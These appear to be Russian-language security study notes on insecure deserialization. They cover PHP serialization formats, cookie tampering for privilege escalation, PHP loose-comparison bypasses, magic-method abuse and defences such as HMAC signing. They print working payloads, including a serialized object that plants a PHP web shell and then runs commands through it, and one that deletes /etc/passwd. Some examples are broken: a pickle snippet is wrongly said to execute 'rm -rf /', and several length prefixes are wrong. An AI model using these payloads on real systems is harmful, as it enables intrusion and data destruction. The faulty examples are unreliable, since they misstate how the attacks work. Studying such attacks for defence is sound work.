
# Что это такое?

- Сериализация — это **"упаковка" данных** в удобный формат для хранения или передачи.  
- Десериализация — **"распаковка"** обратно в объект.

Основные форматы:  
- **JSON** – текстовый, человекочитаемый, универсальный.  
- **Pickle (Python)** – бинарный, работает с любыми объектами Python.  
- **Protobuf, MessagePack** – бинарные, более эффективные, чем JSON.

- `https://youtu.be/pXGa1Kq6AGc?si=VqJA731X-_u8gGOR` - Рамазан рассказывать про банкинг где есть подобная уязвимость


```
O:<длина_имени_класса>:"<имя_класса>":<количество_полей>:{<поля>}

s:<длина_имени_поля>:"<имя_поля>";<значение>
```
- `s` — строка (string).
- `i` — целое число (integer).
- `b` — булево (boolean).
- `a` — массив (array).
- `N` — `null`.

```
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```
Это можно интерпретировать следующим образом:
- `O:4:"User"`- Объект с 4-х символьным именем класса`"User"`
- `2`- объект имеет 2 атрибута
- `s:4:"name"`- Ключ первого атрибута — это строка из 4 символов.`"name"`
- `s:6:"carlos"`- Значение первого атрибута — строка из 6 символов.`"carlos"`
- `s:10:"isLoggedIn"`- Ключ второго атрибута — строка из 10 символов.`"isLoggedIn"`
- `b:1`- Значение второго атрибута - логическое значение.`true`

### Примеры сериализации

1. У нас есть объект `Пользователь` в Python:
```
user = {
    "name": "Алексей",
    "age": 30,
    "is_active": True
}
```

2. Сериализация (в JSON-строку):
```
import json

json_string = json.dumps(user)  
print(json_string)  
```
Вывод:
```
{"name": "Алексей", "age": 30, "is_active": true}
```

3. Десериализация (из JSON обратно в объект):
```
restored_user = json.loads(json_string)
print(restored_user["name"])  # "Алексей"
```

### Примечание
При работе с различными языками программирования сериализация может называться маршаллингом (Ruby) или травлением (Python). Эти термины являются синонимами «сериализации» в данном контексте.


# Что такое небезопасная десериализация?

Небезопасная десериализация — это когда контролируемые пользователем данные десериализуются веб-сайтом. Это потенциально позволяет злоумышленнику манипулировать сериализованными объектами, чтобы передать вредоносные данные в код приложения.

Можно даже заменить сериализованный объект объектом совершенно другого класса. Тревожно, что объекты любого класса, доступного веб-сайту, будут десериализованы и инстанцированы, независимо от того, какой класс ожидался. По этой причине небезопасная десериализация иногда известна как уязвимость «внедрения объекта».

Объект неожиданного класса может вызвать исключение. Однако к этому времени ущерб может быть уже нанесен. ==Многие атаки на основе десериализации завершаются **до** завершения десериализации.== Это означает, что сам процесс десериализации может инициировать атаку, даже если собственные функции веб-сайта не взаимодействуют напрямую с вредоносным объектом. По этой причине веб-сайты, логика которых основана на строго типизированных языках, также могут быть уязвимы для этих методов.


# Как возникают уязвимости небезопасной десериализации?

**Проблема:** Если программа без проверки десериализует данные, которые контролирует злоумышленник, это может привести к **взлому сервера, утечке данных или выполнению вредоносного кода**.

#### **1. Доверие к данным пользователя**
**Ошибка разработчика:**  
_"Если пользователь прислал данные в формате JSON/Pickle — значит, они безопасные!"_
- **Пример (Python):**
```
import pickle
import os

# Злоумышленник прислал такой "безобидный" объект
malicious_data = pickle.dumps({"command": "rm -rf /"})  # Удалить всё на сервере!

# Сервер без проверки десериализует данные
data = pickle.loads(malicious_data)  # Выполнится команда удаления!
```
- Pickle при десериализации может выполнять произвольный код. Если сервер доверяет данным от клиента — это **RCE (Remote Code Execution)**.

#### **2. Слишком поздняя проверка данных**
**Ошибка разработчика:**  
_"Сначала десериализуем, потом проверим!"_
- **Пример (PHP):**
```
$data = unserialize($_POST['user_data']);  // Десериализация ДО проверки
if ($data->role !== 'admin') { die("Access denied!"); }
```
- Если злоумышленник подменит `user_data` так, что после десериализации `$data->role` станет `'admin'`, проверка не сработает.

#### **3. Опасные зависимости (цепочки вызовов)**
**Ошибка разработчика:**  
_"Мы используем библиотеку X, она точно безопасна!"_

- Если в проекте 100+ зависимостей, в одной из них может быть уязвимый класс:


# [[Как использовать небезопасные уязвимости десериализации]]

### Как определить небезопасную десериализацию
Выявление небезопасной десериализации относительно просто, независимо от того, проводим мы тестирование по методу белого или черного ящика.

- [[Как использовать небезопасные уязвимости десериализации#Формат сериализации PHP|Формат сериализации PHP]]
- [[Как использовать небезопасные уязвимости десериализации#Формат сериализации Java|Формат сериализации Java]]

### Манипулирование сериализованными объектами
В целом, есть два подхода, которые мы можем использовать при манипулировании сериализованными объектами. Мы можем либо 
- редактировать объект непосредственно в форме потока байтов
- либо написать короткий скрипт на соответствующем языке, чтобы создать и сериализовать новый объект самостоятельно. 
Последний подход часто проще при работе с двоичными форматами сериализации.

### Изменение атрибутов объекта
В качестве простого примера рассмотрим веб-сайт, который использует сериализованный `User`объект для хранения данных о сеансе пользователя в cookie. Если злоумышленник обнаружит этот сериализованный объект в HTTP-запросе, он может декодировать его, чтобы найти следующий поток байтов:
```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```
- Атрибут `isAdmin`— очевидный интересный момент. 

Злоумышленник может просто изменить логическое значение атрибута на `1`(true), перекодировать объект и перезаписать свой текущий файл cookie этим измененным значением. В отрыве от всего этого это не имеет никакого эффекта. Однако предположим, что веб-сайт использует этот файл cookie для проверки того, имеет ли текущий пользователь доступ к определенным административным функциям:
```
$user = unserialize($_COOKIE); 

if ($user->isAdmin === true) { 
	// allow access to admin interface 
}
```
Этот уязвимый код создаст экземпляр `User`объекта на основе данных из cookie, включая атрибут, измененный злоумышленником `isAdmin`. **Ни в какой момент подлинность сериализованного объекта не проверяется**. Затем эти данные передаются в условный оператор и, в этом случае, допускают легкое повышение привилегий.

Этот простой сценарий не является распространенным в дикой природе.

### Изменение типов данных
Также возможно предоставлять неожиданные типы данных.

Логика на основе PHP особенно уязвима для такого рода манипуляций из-за поведения ее нестрогого оператора сравнения ( `==`) при сравнении различных типов данных.  Например, если мы выполняем нестрогое сравнение между целым числом и строкой, ==PHP попытается преобразовать строку в целое число, что означает, что оно `5 == "5"`оценивается как `true`.==

Необычно, но ==это также работает для любой буквенно-цифровой строки, которая начинается с числа==. В этом случае PHP фактически преобразует всю строку в целое значение на основе начального числа. Остальная часть строки полностью игнорируется. Поэтому `5 == "5 of something"` на практике рассматривается как `5 == 5`.

==Аналогично, в PHP 7.x и более ранних версиях== результатом сравнения `0 == "Example string"`будет `true`, поскольку ==PHP обрабатывает всю строку как целое число `0`.==

Рассмотрим случай, когда этот свободный оператор сравнения используется в сочетании с контролируемыми пользователем данными из десериализованного объекта. Это может потенциально привести к опасным логическим ошибкам.
```
$login = unserialize($_COOKIE) 

if ($login['password'] == $password) { 
	// log in successfully 
}
```
- Допустим, легитимный сериализованный объект выглядит так:
```
$user = [
    'username' => 'admin',
    'password' => 'strongpass123'
];
echo serialize($user);
```
- Атакующий модифицирует объект меняя `password` на `0` (int):
```
$malicious = [
    'username' => 'admin',
    'password' => 0
];
echo serialize($malicious);

a:2:{s:8:"username";s:5:"admin";s:8:"password";i:0;}
```
- Теперь, если передать эту строку в `$_COOKIE['auth']`, проверка:
```
if (0 == "strongpass123")  // true!
```

Если бы пароль приходил напрямую из `$_POST` или `$_GET`, PHP автоматически привёл бы его к строке:
```
$password = $_POST['password'];  // "0" (string)
if ("0" == "strongpass123")  // false (нормальная проверка)
```
- Но **десериализация сохраняет тип `int`**, поэтому `0` остаётся числом.

#### Примечание
==В PHP 8 и более поздних версиях `0 == "Example string"`сравнение оценивается как `false`, поскольку строки больше не преобразуются неявно в `0` во время сравнений.== В результате этот эксплойт невозможен в этих версиях PHP.
- Поведение при сравнении буквенно-цифровой строки, начинающейся с цифры, в PHP 8 остается прежним. Таким образом, `5 == "5 of something"`по-прежнему рассматривается как `5 == 5`.

Иметь в виду, что при изменении типов данных в любом формате сериализованных объектов важно не забыть обновить все метки типов и индикаторы длины в сериализованных данных. В противном случае сериализованный объект будет поврежден и не будет десериализован.

# Использование функциональности приложения

Когда приложение **десериализует** данные (например, из куки или запроса), оно восстанавливает **объект** со всеми его свойствами.  
Если злоумышленник подменит эти данные, он может:

- **Изменить свойства объекта** (например, путь к файлу).
- **Вызвать опасные методы** (например, удаление файлов или выполнение кода).

### Пример 1 Удаление произвольного файла через
Допустим, есть класс `User` и функция удаления аватарки:
```
class User {
    public $username;
    public $image_location; // Путь к файлу аватарки

    public function deleteAvatar() {
        unlink($this->image_location); // Удаляет файл!
    }
}

// Десериализуем данные из куки
$user = unserialize($_COOKIE['user']);

// Вызываем метод (например, при удалении аккаунта)
$user->deleteAvatar();
```
- **Сериализованные данные:**
```
O:4:"User":2:{s:8:"username";s:5:"vasek";s:13:"image_location";s:23:"/uploads/vasek_avatar.jpg";}
```

**Атака (подменяем `image_location`)** Злоумышленник меняет путь на `/etc/passwd`:
```
O:4:"User":2:{s:8:"username";s:5:"vasek";s:13:"image_location";s:11:"/etc/passwd";}
```
- При вызове `$user->deleteAvatar()` сервер удалит не аватарку, а системный файл `/etc/passwd`!

### Пример 2: Магические методы и RCE (выполнение кода)
PHP-классы могут содержать **магические методы**, которые вызываются автоматически при определённых событиях (например, `__wakeup()`, `__destruct()`).
```
class Logger {
    public $log_file;
    public $log_data;

    public function __destruct() {
        // При уничтожении объекта записывает данные в файл
        file_put_contents($this->log_file, $this->log_data);
    }
}

// Десериализуем данные
$logger = unserialize($_POST['data']);
```

Злоумышленник сериализует вредоносный объект:
```
O:6:"Logger":2:{s:8:"log_file";s:9:"shell.php";s:8:"log_data";s:25:"<?php system($_GET['cmd']); ?>";}
```
1. Сервер десериализует объект.
2. Когда объект уничтожается (например, в конце скрипта), вызывается `__destruct()`
3. На сервере создаётся файл `shell.php` с кодом `system($_GET['cmd'])`.
4. Теперь злоумышленник может выполнять команды:
```
http://site.com/shell.php?cmd=id
```

# [[Как предотвратить уязвимости небезопасной десериализации]]

##### 1. Не десериализовать данные от пользователя вообще
    - Использовать JSON без функций (`json.loads()` вместо `pickle`).

##### 2. Цифровая подпись данных
- Если данные должны приходить от клиента — подписывать их HMAC.

**HMAC** (Hash-based Message Authentication Code) — это механизм проверки **целостности** и **подлинности** данных с помощью криптографического хеша и секретного ключа.

1. Сервер подписывает данные перед отправкой:
```
    data = b'{"user": "guest", "role": "user"}'
    signature = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
```
2. Отправляет клиенту:
```
{
  "data": "{\"user\": \"guest\", \"role\": \"user\"}",
  "signature": "7a8f9b3c6d5e4f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8"
}
```
- Клиент возвращает эти данные обратно (например, в cookie).

3. Злоумышленник пытается подменить `role` на `admin`:
```
{
  "data": "{\"user\": \"hacker\", \"role\": \"admin\"}",
  "signature": "старая_подпись"  # не знает новый HMAC!
}
```

4. Сервер проверяет подпись:
```
received_data = b'{"user": "hacker", "role": "admin"}'
is_valid = verify_hmac(received_data, "старая_подпись")  # False
```
- → Подпись не совпадает! Данные отбрасываются.

##### 3. Белые списки классов
- Разрешать десериализацию только безопасных классов.

##### 4. Остальные варианты
- Запретите опасные магические методы в критичных классах.
- Используйте JSON (`json_decode()`) или другие безопасные форматы.